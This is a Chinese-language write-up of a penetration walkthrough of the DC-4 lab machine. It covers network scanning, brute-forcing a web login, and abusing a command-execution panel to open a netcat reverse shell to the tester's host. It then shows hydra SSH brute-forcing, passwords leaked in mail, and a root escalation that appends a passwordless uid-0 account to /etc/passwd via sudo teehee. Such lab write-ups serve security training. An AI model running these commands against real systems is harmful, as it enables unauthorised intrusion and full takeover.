---
title: "DC-4渗透笔记"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# DC-4渗透笔记

### 信息搜集

#### 探测IP

nmap扫c段：

~~~shell
nmap -sP 192.168.111.0/24
~~~

![image-20240718155211151](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155211131-743337984.png)

可以确定IP为192.168.111.191

#### 端口探测

nmap探测端口：

~~~shell
nmap -sV -p- 192.168.111.191
~~~

![image-20240718155313518](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155313353-376482775.png)

可见开启了两个端口：

* 22端口，ssh服务
* 80端口，http服务

#### 网页信息搜集

老规矩，先看看80端口的网页：

![image-20240718155256688](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155256484-325733961.png)

一个登录框而且不是通用的CMS，那么思路就放在登录框对抗上

先扫目录看看：

![image-20240718155424959](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155425009-1387193229.png)

确实没啥利用点，直接开始我们的登录口对抗

### 漏洞利用

#### 登录口对抗

这里首先考虑弱口令和sql注入，先抓个包爆破一下：

![image-20240718152720235](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718152720761-2037406251.png)

用户名用admin试试，密码跑一下字典

![image-20240718152820141](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718152820340-694142984.png)

这不就爆出来了，密码为happy，直接登录：

![image-20240718155531165](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155531007-1243704515.png)

顺利进入后台，这里有个执行命令的选项，我们点run试试：
![image-20240718155614070](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718155613875-1716370423.png)

这里是执行了`ls -l`，抓包看看命令是否可控呢：
![image-20240718160133556](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718160133715-914601756.png)

命令可控，将命令改为whoami，成功执行，思路对了，那么接下来肯定想到反弹shell了

#### 命令执行反弹shell

kali上开启监听：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718160426929-1821824375.png" alt="image-20240718160426968" style="zoom:150%;" />

接下来执行反弹shell的命令：

~~~shell
nc 192.168.111.132 4444 -e /bin/bash
~~~

注意参数的空格改为+号：

![image-20240718160719599](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718160719286-2062335091.png)

连接成功：

![image-20240718160808574](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718160808391-1494982083.png)

太丑了，python获取一个pty：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718161033558-132948239.png" alt="image-20240718161033903" style="zoom:150%;" />

舒服了，接下来应该就是权限提升了

### 权限提升

#### hydra爆破ssh

看看有没有什么可疑的文件比如sudo，suid之类的：

![image-20240718162934835](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718162934940-395740859.png)

没有太多收获，去家目录看看呢：

![image-20240718163432974](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718163432813-674293905.png)

可见有三个用户，而jim用户的文件有点可疑，仔细看看：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718164215250-478892187.png" alt="image-20240718164215415" style="zoom:150%;" />

mbox应该是个邮箱，但权限不够看不了

![image-20240718163921124](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718163920967-731804546.png)

test.sh是个普通脚本文件，但backups文件夹中有旧密码备份，很容易想到爆破ssh了，用kali自带的hydra一下：

~~~shell
hydra -l jim -P ./pass.txt 192.168.111.191 ssh
~~~

![image-20240718164848722](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718164848649-1273341394.png)

ok了，密码是**jibril04**，直接ssh连接：

![image-20240718165029135](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718165028968-580019116.png)

成功获得了jim的shell

#### 邮件泄露密码

看看jim有没有sudo权限呢：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718165201345-1653324443.png" alt="image-20240718165201711" style="zoom:150%;" />

好吧没有，换个思路，刚才有个mbox文件还没看：

![image-20240718165311743](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718165311474-343713632.png)

确实是个正常邮件，说明该系统是开启了邮箱服务的，我们可以看看系统邮箱目录：

![image-20240718165730636](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718165730724-1342177972.png)

发现charles发给jim的邮箱中泄露了密码，我们用该密码切换charles用户到试试：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718170004649-350669042.png" alt="image-20240718170004911" style="zoom:150%;" />

成功切换到charles

#### teehee打sudo提权

还是老规矩，看看sudo权限：

![image-20240718170045492](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718170045290-6741360.png)

发现可以免密sudo执行`/usr/bin/teehee`，恰好teehee可以用来打sudo提权：

>teehee是个小众的linux编辑器，提权核心思路就是利用其在passwd文件中追加一条uid为0的用户条目：
>
>~~~shell
>echo "yuy0ung::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
>~~~
>
>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行`su yuy0ung`就可以登录到yuy0ung用户，而该用户因为uid为0，所以也是root权限

我们直接添加一个root权限的空密码hacker账户，并直接su免密登录：

![image-20240718170758550](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718170758428-502402817.png)

成功提权并在/root中拿到flag

### 总结

本次渗透过程有如下漏洞或利用：

* 网页登录口的弱口令爆破
* 网页后台命令执行参数可控
* 用户备份文件泄露密码
* hydra利用泄露密码爆破ssh
* 敏感邮件未删除泄露密码
* teehee可免密sudo执行导致权限提升